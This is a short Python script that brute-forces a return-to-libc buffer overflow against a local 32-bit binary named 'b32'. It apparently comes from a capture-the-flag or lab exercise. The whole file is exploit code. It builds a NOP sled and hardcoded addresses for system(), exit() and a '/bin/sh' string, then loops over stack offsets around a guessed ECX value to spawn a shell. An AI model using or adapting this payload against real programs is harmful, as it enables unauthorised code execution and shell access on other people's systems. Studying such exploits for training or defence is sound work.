from subprocess import call

tohex = lambda x : x[2:].decode('hex')[::-1]
nops = '\x90'*32
ecx = 0xffffca08
sys = '0xf7ddc6e0'	# p system
ex = '0xf7dcf7a0'	# 
sh = '0xf7f3acee'#str(0x00007ffff7ddc000 + 0x183cee)

for i in range(-128,128,4):
    _ecx = hex(ecx + i)
    payload = nops + tohex(_ecx) + tohex(sys) + tohex(ex) + tohex(sh)
    print(ecx)
    call(['./b32', payload])